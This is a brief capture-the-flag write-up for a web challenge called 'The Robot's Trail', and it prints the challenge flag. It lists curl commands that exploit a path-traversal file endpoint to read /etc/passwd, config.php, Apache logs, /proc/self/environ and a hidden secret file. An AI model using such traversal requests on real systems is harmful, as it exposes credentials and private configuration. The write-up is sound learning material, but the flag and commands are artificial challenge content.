# THE ROBOT'S TRAIL
In this challenge I have to open a sequence of secret files to get the flag.

## My solve
**Flag:** `citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`

- First I inspected the code of the intial webpage to see a hiiden <div> tag that took me to another webpage.
- There I got a file path as a clue and then ran the following commands in my ubuntu terminal
```bash
curl -i 'https://therobotstrail.citadel.cryptonitemit.in/file?path=../../etc/passwd'

curl -i "https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/www/html/config.php"

curl -i "https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/log/apache2/access.log"

curl -i "https://therobotstrail.citadel.cryptonitemit.in/file?path=/proc/self/environ"

curl -i "https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret"

curl -i "https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret/flag.txt"
```
## What I learned
Through this challenge I learnt that:
-  The most basic use of curl is to retrieve content from a URL and display it in the terminal.



